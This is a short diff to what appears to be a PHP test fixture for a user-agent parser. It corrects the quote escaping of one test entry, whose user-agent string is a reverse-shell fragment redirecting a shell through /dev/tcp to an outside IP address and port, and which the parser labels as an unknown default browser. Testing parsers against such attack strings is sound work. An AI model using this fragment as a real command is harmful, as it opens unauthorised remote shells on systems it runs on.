@@ -2018,7 +2018,7 @@ return [
         ],
     ],
     'test-0010-84' => [
-        'ua'         => '<> /dev/tcp/95.143.194.102/81 >&0 2>&0\\'',
+        'ua'         => '<> /dev/tcp/95.143.194.102/81 >&0 2>&0\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
